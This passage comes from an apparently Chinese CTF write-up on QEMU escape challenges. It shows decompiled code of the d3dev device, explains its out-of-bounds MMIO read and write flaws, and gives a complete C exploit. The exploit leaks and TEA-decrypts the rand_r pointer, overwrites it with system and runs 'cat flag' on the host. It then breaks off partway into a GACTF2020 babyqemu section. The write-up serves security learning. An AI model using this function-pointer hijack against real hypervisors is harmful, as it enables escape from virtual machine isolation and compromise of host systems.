class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-mmio-write"><a href="#d3dev-mmio-write" class="headerlink" title="d3dev_mmio_write"></a>d3dev_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">uint32_t</span> v8; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">uint32_t</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">uint32_t</span> v10; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">694</span>);</span><br><span class="line">      v13 = ((<span class="type">unsigned</span> __int64)v5[<span class="number">347</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">1640531527</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="type">unsigned</span> <span class="type">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">-957401312</span> );</span><br><span class="line">      v5[<span class="number">347</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-pmio-read"><a href="#d3dev-pmio-read" class="headerlink" title="d3dev_pmio_read"></a>d3dev_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_pmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = opaque-&gt;memory_mode;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      result = opaque-&gt;seek;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      result = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="d3dev-pmio-write"><a href="#d3dev-pmio-write" class="headerlink" title="d3dev_pmio_write"></a>d3dev_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                   &amp;opaque-&gt;r_seed,</span><br><span class="line">                   <span class="number">28LL</span>,</span><br><span class="line">                   val,</span><br><span class="line">                   *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看到在<code>d3dev_mmio_read</code>函数和<code>d3dev_mmio_write</code>函数中对数据进行了<code>tea</code>加密，而在<code>d3dev_pmio_write</code>函数中有如下代码可以令<code>key</code>的值为<code>0</code>，方便了我们进行加解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">4</span> )&#123;</span><br><span class="line">  *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>d3dev_mmio_read</code>函数中有以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br></pre></td></tr></table></figure><p>可以看见程序并没有对<code>addr</code>的合法性进行检测，导致我们可以对数据进行越界读<br>在<code>d3dev_mmio_write</code>函数中存在以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">opaque-&gt;blocks[v4] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br></pre></td></tr></table></figure><p>和上面一样的问题，我们可以对该数组越界写<br>再看<code>d3dev_pmio_write</code>函数中的以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br><span class="line">  key = opaque-&gt;key;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *key++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                &amp;opaque-&gt;r_seed,</span><br><span class="line">                <span class="number">28LL</span>,</span><br><span class="line">                val,</span><br><span class="line">                *(_QWORD *)&amp;size);</span><br><span class="line">  <span class="keyword">while</span> ( key != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个地方调用了函数指针<code>opaque-&gt;rand_r</code>，其第一个参数为<code>&amp;opaque-&gt;r_seed</code>，该参数在下面的代码片段中可控</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr == <span class="number">28</span> )&#123;</span><br><span class="line">  opaque-&gt;r_seed = val;</span><br></pre></td></tr></table></figure><p>最后再看看<code>d3devState</code>结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000 d3devState struc ; (sizeof=0x1300, align=0x10, copyof_4545)</span><br><span class="line">00000000 pdev PCIDevice_0 ?</span><br><span class="line">000008E0 mmio MemoryRegion_0 ?</span><br><span class="line">000009D0 pmio MemoryRegion_0 ?</span><br><span class="line">00000AC0 memory_mode dd ?</span><br><span class="line">00000AC4 seek dd ?</span><br><span class="line">00000AC8 init_flag dd ?</span><br><span class="line">00000ACC mmio_read_part dd ?</span><br><span class="line">00000AD0 mmio_write_part dd ?</span><br><span class="line">00000AD4 r_seed dd ?</span><br><span class="line">00000AD8 blocks dq 257 dup(?)</span><br><span class="line">000012E0 key dd 4 dup(?)</span><br><span class="line">000012F0 rand_r dq ?                             ; offset</span><br><span class="line">000012F8 db ? ; undefined</span><br><span class="line">000012F9 db ? ; undefined</span><br><span class="line">000012FA db ? ; undefined</span><br><span class="line">000012FB db ? ; undefined</span><br><span class="line">000012FC db ? ; undefined</span><br><span class="line">000012FD db ? ; undefined</span><br><span class="line">000012FE db ? ; undefined</span><br><span class="line">000012FF db ? ; undefined</span><br><span class="line">00001300 d3devState ends</span><br></pre></td></tr></table></figure><p>现在思路就很明显了，可以通过数组越界读读取<code>rand_r</code>出原有的函数指针来泄露地址，然后在利用数组越界写来修改<code>rand_r</code>处的函数指针为<code>system</code>，最后修改<code>r_seed</code>为参数即可完成逃逸<br>这里有一个需要注意的点，我们在<code>exp</code>中访问<code>PCI</code>设备的<code>MMIO</code>空间使用的是<code>&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</code> 而不是平时的 <code>&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</code>。经过学习后我才发现原来这个并不是固定值<br>我们首先查看<code>d3dev_class_init</code>函数并将<code>v2</code>变量设置为<code>PCIDeviceClass</code>类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="type">const</span> <span class="type">char</span> *)&amp;env.tlb_table[<span class="number">1</span>][<span class="number">115</span>]._anon_0.dummy[<span class="number">31</span>],</span><br><span class="line">                           <span class="string">&quot;/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c&quot;</span>,</span><br><span class="line">                           <span class="number">229</span>,</span><br><span class="line">                           <span class="string">&quot;d3dev_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;realize = pci_d3dev_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;v2-&gt;vendor_id = <span class="number">0x11E82333</span>;</span><br><span class="line">  v2-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在命令行中输入<code>lspci</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0200: 8086:100e</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 00ff: 2333:11e8</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure><p>我们即可通过<code>class_id</code>和<code>vendor_id</code>来找到我们所需要的<code>PCI</code>设备</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(addr+mmio_mem)) = val;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(addr+mmio_mem));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    outl(val,addr+pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">en</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        high -= (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        low -= (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">de</span><span class="params">(<span class="type">uint32_t</span> high,<span class="type">uint32_t</span> low)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">        low += (high*<span class="number">16</span>) ^ (high+sum) ^ (high&gt;&gt;<span class="number">5</span>);</span><br><span class="line">        high += (low*<span class="number">16</span>) ^ (low+sum) ^ (low&gt;&gt;<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)high * <span class="number">0x100000000</span> + low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>); <span class="comment">// opaque-&gt;seek = 0x100</span></span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0</span>); <span class="comment">// 令key为0 方便tea加解密</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;region rand_r: %p\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> randr = de(rand_r/<span class="number">0x100000000</span>,rand_r%<span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode randr: %p\n&quot;</span>,randr);</span><br><span class="line">    <span class="type">uint64_t</span> system = randr + <span class="number">0xa5f0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system: %p\n&quot;</span>, system);</span><br><span class="line">    <span class="type">uint64_t</span> encode_system = en(system / <span class="number">0x100000000</span>, system % <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encode system: %p\n&quot;</span>, encode_system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在rand_r写入system</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system%<span class="number">0x100000000</span>); <span class="comment">//只能4字节4字节的写入</span></span><br><span class="line">    mmio_write(<span class="number">24</span>,encode_system/<span class="number">0x100000000</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0x67616c66</span>); <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">28</span>,<span class="number">0x20746163</span>); <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GACTF2020-babyqemu"><a href="#GACTF2020-babyqemu" class="headerlink" title="GACTF2020 babyqemu"></a>GACTF2020 babyqemu</h2><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="denc-mmio-read"><a href="#denc-mmio-read" class="headerlink" title="denc_mmio_read"></a>denc_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size != <span 